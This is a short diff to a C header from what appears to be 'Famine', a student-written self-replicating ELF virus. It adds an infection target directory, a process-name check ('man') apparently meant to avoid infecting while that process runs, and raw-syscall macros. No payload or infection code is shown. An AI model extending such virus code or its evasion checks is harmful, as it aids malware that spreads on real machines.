@@ -33,7 +33,10 @@
 # define SEEK_CUR 1
 # define SEEK_END 2
 
+
+/* config */
 # define INFESTED_DIR "/tmp/test/"
+# define PROC_DODGE "man"
 
 # define SIGNATURE "Famine version 1.0 (c)oded by gmorer-rcarette"
 
@@ -49,7 +52,7 @@
 # define MUNMAP(addr, length) syscall1(SYS_MUNMAP, (u64)addr, (u64)length)
 # define LSEEK(fd, offset, whence) syscall3(SYS_LSEEK, (u64)fd, (u64)offset, (u64)whence)
 # define GETDENTS64(fd, dirp, count) syscall3(SYS_GETDENTS64, (u64)fd, (u64)dirp, (u64)count)
-# define READLINK(pathname, buff, buffsize) syscall3(SYS_READLINK, pathname, buff, buffsize)
+# define READLINK(pathname, buff, buffsize) syscall3(SYS_READLINK, (u64)pathname, (u64)buff, (size_t)buffsize)
 
 typedef struct	s_static
 {
@@ -105,5 +108,8 @@ void	ft_putul(u64 i);
 
 /* get_rel_addr.s */
 u64 get_rel_addr();
+
+/* process.c */
+int is_proc_actif(void);
 
 #endif
